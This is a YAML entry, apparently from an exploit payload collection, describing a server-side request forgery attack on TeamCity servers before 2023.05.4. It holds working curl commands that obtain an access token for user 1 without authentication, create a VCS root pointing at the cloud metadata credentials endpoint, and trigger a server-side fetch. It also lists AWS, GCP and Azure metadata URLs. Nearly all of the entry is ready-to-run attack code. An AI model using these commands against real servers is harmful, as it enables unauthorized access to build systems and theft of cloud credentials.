  ssrf:
  - code: "# Configure a VCS root with an internal URL \u2014 TeamCity fetches it\
      \ server-side\nTOKEN=$(curl -s -X POST \"http://victim.com:8111/app/rest/users/id:1/tokens/RPC2\"\
      \ \\\n  -H \"Content-Type: application/json\" \\\n  | python3 -c \"import sys,json;\
      \ print(json.load(sys.stdin)['value'])\")\n\ncurl -s -X POST \"http://victim.com:8111/app/rest/vcs-roots\"\
      \ \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\"\
      \ \\\n  -d '{\n    \"name\": \"probe\",\n    \"vcsName\": \"jetbrains.git\"\
      ,\n    \"project\": {\"id\": \"_Root\"},\n    \"properties\": {\"property\"\
      : [\n      {\"name\": \"url\", \"value\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\
      },\n      {\"name\": \"authMethod\", \"value\": \"ANONYMOUS\"}\n    ]}\n  }'\n\
      \n# Trigger a VCS check \u2014 TeamCity attempts to connect to the URL server-side:\n\
      curl -s \"http://victim.com:8111/app/rest/vcs-roots/name:probe/repositoryState\"\
      \ \\\n  -H \"Authorization: Bearer $TOKEN\"\n"
    comment: |
      TeamCity fetches VCS root URLs server-side when checking repository state.
      Supplying an internal URL causes the TeamCity server to make an outbound HTTP
      request to the target. Error messages or connection timeout differences leak
      whether the internal host is reachable (semi-blind SSRF).
      Cloud metadata endpoints:
      - AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/
      - GCP:        http://metadata.google.internal/computeMetadata/v1/
      - Azure:      http://169.254.169.254/metadata/instance?api-version=2021-02-01
    contexts:
      unauthenticated:
    version: |
      < 2023.05.4
